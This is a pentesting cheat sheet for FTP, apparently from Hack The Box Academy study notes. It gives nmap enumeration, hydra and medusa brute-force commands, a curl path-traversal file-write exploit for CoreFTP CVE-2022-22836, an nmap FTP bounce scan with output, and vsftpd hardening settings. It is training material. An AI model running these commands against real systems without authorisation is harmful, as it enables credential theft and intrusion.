# Enumeration

```
nmap -sVC -p21 --script=ftp* $IP

# nmap scripts
find /usr/share/nmap/scripts | grep ftp-*
```

# Interacting w/ service

```
# Connect
ftp $IP
nc -nv $IP 21
telnet $IP 21

# connect using TLS
openssl s_client -connect $IP:21 -starttls ftp

# download all available files
wget -m --no-passive ftp://anonymous:anonymous@target

# ftp web access
ftp://$IP

# Disabling passive mode if stuck w/ message saying "229 Entering Extended Passive Mode (|||49170|)" when entering command
ftp> passive
ftp -p $IP
```

# Bruteforce

```
hydra -l user -P password.list $IP -t 64 ftp
medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h $IP -M ftp
```

# Search in exploitdb

```
searchsploit ProFTPD
searchsploit vsFTPd
```

# CoreFTP Exploitation - CVE-2022-22836

`CoreFTP before build 727` vulnerability is for an FTP service that does not correctly process the `HTTP PUT` request and leads to an `authenticated directory`/`path traversal,` and `arbitrary file write` vulnerability.
We can write files outside the directory to which the service has access.

This FTP service uses an HTTP `POST` request to upload files.
However, the CoreFTP service allows an HTTP `PUT` request, which we can use to write content to files.

The exploit is a simple request with the correct parameters :
```bash
Bailly@htb[/htb]$ curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
```

We create a raw HTTP `PUT` request (`-X PUT`) with basic auth (`--basic -u <username>:<password>`), the path for the file (`--path-as-is https://<IP>/../../../../../whoops`), and its content (`--data-binary "PoC."`) with this command. Additionally, we specify the host header (`-H "Host: <IP>"`) with the IP address of our target system.

https://academy.hackthebox.com/module/116/section/1166

# FTP Bounce Attack :

An FTP bounce attack is a network attack that uses FTP servers to deliver outbound traffic to another device on the network.
The attacker uses a `PORT` command to trick the FTP connection into running commands and getting information from a device other than the intended server.

Consider we are targetting an FTP Server `FTP_DMZ` exposed to the internet. Another device within the same network, `Internal_DMZ`, is not exposed to the internet.
We can use the connection to the `FTP_DMZ` server to scan `Internal_DMZ` using the FTP Bounce attack and obtain information about the server's open ports.

![[ftp_bounce_attack.webp]]

The `Nmap` -b flag can be used to perform an FTP bounce attack :

```bash
Bailly@htb[/htb]$ nmap -Pn -v -n -p80 -b <anonymous:password@10.10.110.213> 172.17.0.2

Starting Nmap 7.80 ( <https://nmap.org> ) at 2020-10-27 04:55 EDT
Resolved FTP bounce attack proxy to 10.10.110.213 (10.10.110.213).
Attempting connection to <ftp://anonymous:password@10.10.110.213:21>
Connected:220 (vsFTPd 3.0.3)
Login credentials accepted by FTP server!
Initiating Bounce Scan at 04:55
FTP command misalignment detected ... correcting.
Completed Bounce Scan at 04:55, 0.54s elapsed (1 total ports)
Nmap scan report for 172.17.0.2
Host is up.

PORT   STATE  SERVICE
80/tcp open http

<SNIP>
```

# FTP Commands

| **FTP Commands** | **Description**                               |
| ---------------- | --------------------------------------------- |
| `status`         | Get an overview of the server’s settings      |
| `ls -R`          | Show files recursively                        |
| `get notes.txt`  | Download the file `notes.txt`                 |
| `mget`           | Download multiple files                       |
| `put notes.txt`  | Upload the file `notes.txt` on the FTP server |
| `mput`           | Upload multiple files                         |
| `trace`          | Get more information about the packets        |
| `help`           | Get all available commands on the server      |
| `binary`         | Set binary mode for file transfer             |
| `ascii`          | Set ascii mode for file transfer              |

[FTP Commands Cheat Sheet](https://www.ionos.fr/digitalguide/serveur/know-how/commandes-ftp/)

# Remediation :

```
# conf file 
/etc/vsftpd.conf

# Conf file used to DENY access to certain users
/etc/ftpusers
```

| Anonymous login                | Description                                                                                                                                |
| ------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------ |
| `anonymous_enable=NO`          | Allowing anonymous login?                                                                                                                  |
| `anon_upload_enable=NO`        | Allowing anonymous to upload files?                                                                                                        |
| `anon_mkdir_write_enable=NO`   | Allowing anonymous to create new directories?                                                                                              |
| `no_anon_password=NO`          | Do not ask anonymous for password?                                                                                                         |
| `anon_root=/home/username/ftp` | Directory for anonymous users.                                                                                                             |
| `write_enable=NO`              | Allow the usage of FTP commands: STOR, DELE, RNFR, RNTO, MKD, RMD, APPE, and SITE?                                                         |
| **Dangerous settings**         | **Description**                                                                                                                            |
| `hide_ids=YES`                 | All user and group informations (UID + GUID) in directory listings will be displayed as "ftp". Prevent local usernames from being revealed |
| `ls_recurse_enable=YES`        | Allows us to see all the visible content at once using `ls -R`                                                                             |

